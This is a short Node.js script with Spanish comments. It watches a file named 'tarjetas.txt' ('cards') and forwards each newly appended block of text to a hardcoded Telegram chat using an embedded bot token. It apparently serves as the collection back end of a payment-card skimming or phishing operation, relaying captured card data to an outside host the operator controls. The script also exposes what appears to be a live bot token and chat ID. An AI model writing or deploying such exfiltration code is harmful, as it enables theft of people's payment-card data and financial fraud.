const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const TOKEN = '8067315417:AAF5C9qgVMn4bNBGHtw7xtxp0FwUz9wZ6po';
const CHAT_ID = '7375672305';
const FILE_PATH = 'tarjetas.txt';

const bot = new TelegramBot(TOKEN);
let lastSize = 0;

function checkFile() {
    fs.stat(FILE_PATH, (err, stats) => {
        if (err) return console.error('Error leyendo archivo:', err);

        if (stats.size > lastSize) {
            const stream = fs.createReadStream(FILE_PATH, {
                start: lastSize,
                end: stats.size,
                encoding: 'utf8'
            });

            let newData = '';
            stream.on('data', chunk => newData += chunk);
            stream.on('end', () => {
                const bloques = newData.trim().split('\n\n');
                bloques.forEach(bloque => {
                    if (bloque.trim()) {
                        bot.sendMessage(CHAT_ID, bloque).catch(console.error);
                    }
                });
                lastSize = stats.size;
            });
        }
    });
}

setInterval(checkFile, 1000); // revisa cada 3 segundos
